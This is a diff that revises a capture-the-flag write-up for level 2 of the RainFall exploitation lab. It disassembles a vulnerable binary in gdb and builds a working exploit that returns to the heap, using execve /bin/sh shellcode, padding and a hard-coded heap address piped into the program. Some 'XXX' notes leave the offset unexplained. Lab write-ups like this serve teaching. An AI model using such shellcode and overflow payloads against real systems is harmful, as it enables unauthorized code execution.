@@ -1,9 +1,9 @@
 # Level 2
 
-- Once logged in, you will see a binary `level2`
+Once logged in, you will see a binary `level2`.
 
 ```
-[???]$ ssh level2@localhost -p 4242
+$ ssh level2@localhost -p 4242
           _____       _       ______    _ _
          |  __ \     (_)     |  ____|  | | |
          | |__) |__ _ _ _ __ | |__ __ _| | |
@@ -28,13 +28,13 @@ level2@RainFall:~$
 
 ```
 
-let's run this and see what this does
+Let's run this and see what this does.
 ```
 level2@RainFall:~$ ./level2
 
 ```
 
-okay, it seems it tries getting input, so let's try typing something
+It seems it tries getting input, so let's try typing something.
 
 ```
 level2@RainFall:~$ ./level2
@@ -43,9 +43,9 @@ aaaaaaaaaaaaaaaaaaaaaaaa
 level2@RainFall:~$
 ```
 
-different from level1, this takes the input, and prints out the output.
+It's a bit different from level1: this takes the input and prints out the output.
 
-Now let's take a look at the binary
+Now let's take a look at the binary.
 
 ```
 level2@RainFall:~$ gdb ./level2
@@ -71,7 +71,7 @@ End of assembler dump.
 gdb-peda$
 ```
 
-Now, unlike level1, the `p` function is actaully called, so let's take a look at function `p`
+Now, unlike level1, the `p` function is actually called, so let's take a look at function `p`.
 
 ```
 gdb-peda$ disass p
@@ -110,27 +110,26 @@ End of assembler dump.
 gdb-peda$
 ```
 
-The function we want to take a look at is the ones have a vulnerbility, and same as the level, the function `gets` is used. But, on the line from <+36> to <+49>, some comparison is happening.
+The function we want to take a look at is the ones that have a vulnerability, and same as the level, the function `gets` is used. But, on the line from <+36> to <+49>, some comparison is happening.
 
-this basically restricts from using the technique used from last time, because if the eax is in the range of stack, the `and` operation always will turn into `0xb0000000`, which will result jump into the `0x8048527`
+This basically restricts from using the technique used from last time (overwriting `eip` [XXX: right buffer?]), because if `eax` is in the range of stack, the `and` operation always will turn into `0xb0000000`, which will result jump into the `0x8048527`
 
-but what if, instead, jumps to the address to heap, instead of the stack? **AS THE `strdup` FUNCTION is called'**, the input will be allocated to the heap, and if something is managable on heap, like executing the code, or return to the address, there may be a possibility to exploit.
+But what if the program instead jumps to the address to heap, instead of the stack? As the `strdup` function is called, the input will be copied to the heap, and if we can put an exploit on the heap somehow, we may be able to get it to execute.
 
-Let's take a look how it works
+Let's take a look how it works.
 
-From python, let's just try putting the multiple As to check if allocation of heap works
+From python, let's just try putting the multiple `A`s to check if allocation of heap works.
+
 ```
 level1@RainFall:~$ python
 Python 2.7.3 (default, Jun 22 2015, 19:43:34)
 [GCC 4.6.3] on linux2
 Type "help", "copyright", "credits" or "license" for more information.
->>> A*80
-Traceback (most recent call last):
-  File "<stdin>", line 1, in <module>
-NameError: name 'A' is not defined
->>> print('A'*80)
+>>> print('A' * 80)
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 ```
+
+Let's feed that into our program.
 
 ```
 [----------------------------------registers-----------------------------------]
@@ -176,9 +175,9 @@ gdb-peda$ x/30wx 0x804a008
 0x804a078:      0x00000000      0x00000000
 gdb-peda$
 ```
-the value is copied well, but the size of variable was 64, and it only copied 64 bytes.
+The value is correctly copied, but the size of variable was 64, and it only copied 64 bytes.
 
-to check the address of heap, we can use `info proc mappings` command, and the beginning of the heap is shown below, as `0x8048000`
+To check the address of heap, we can use `info proc mappings` command, and the beginning of the heap is shown below as `0x8048000`.
 
 ```
 gdb-peda$ info proc mappings
@@ -202,6 +201,8 @@ Mapped address spaces:
         0xbffdf000 0xc0000000    0x21000        0x0 [stack]
 ```
 
+Here we've found our copied memory in the heap.
+
 ```
 gdb-peda$ x/32wx 0x804a000
 0x804a000:      0x00000000      0x00000049      0x41414141      0x41414141
@@ -213,7 +214,9 @@ gdb-peda$ x/32wx 0x804a000
 0x804a060:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804a070:      0x00000000      0x00000000      0x00000000      0x00000000
 ```
-if we just continue, it will access to the memory address with filled with `AAAA`
+
+If we just continue, it will access to the memory address with filled with `AAAA`.
+
 ```
 [----------------------------------registers-----------------------------------]
 EAX: 0x804a008 ('A' <repeats 64 times>)
@@ -250,20 +253,19 @@ Legend: code, data, rodata, value
 gdb-peda$ ni
 Cannot access memory at address 0x41414145
 ```
-Instead, we can put the code that executes [`shellcode`](http://shell-storm.org/shellcode/files/shellcode-811.php),
 
-if shellcode is passed to the heap, and can be executed, the problem will be solved.
+Instead of just `A`s, we can put the code that executes [`shellcode`](http://shell-storm.org/shellcode/files/shellcode-811.php).
 
-But, in order to allocate the shellcode to the heap, this program takes stdin, passing the shellcode, and instruction address for executing the shellcode is given, the problem may be solved.
+If shellcode is passed to the heap, and can be executed, we'll have successfully gotten around the stack address comparison trap. We can exploit this by passing in shellcode by `stdin`, and `strdup` will helpfully put it on the heap for us.
 
-we know the address of the heap where the shellcode will be stored, `0x804a008` => '\x08\xa0\x04\x80`, and the shellcode (there are many) is below:
+We know the address of the heap where the shellcode will be stored, `0x804a008` => `\x08\xa0\x04\x80`, and the shellcode we used is below:
 ```
 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80 (28 bytes)
 ```
 
-** take a look at this https://wiremask.eu/tools/buffer-overflow-pattern-generator/***
+XXX: how did we come up with 52 to put the offset?
 
-python -c "print ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*52 + '\x08\xa0\x04\x08')" ; cat -
+Let's try using our exploit:
 
 ```
 level2@RainFall:~$ (python -c "print ('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80' + 'A'*52 + '\x08\xa0\x04\x08')" ; cat -) | ./level2
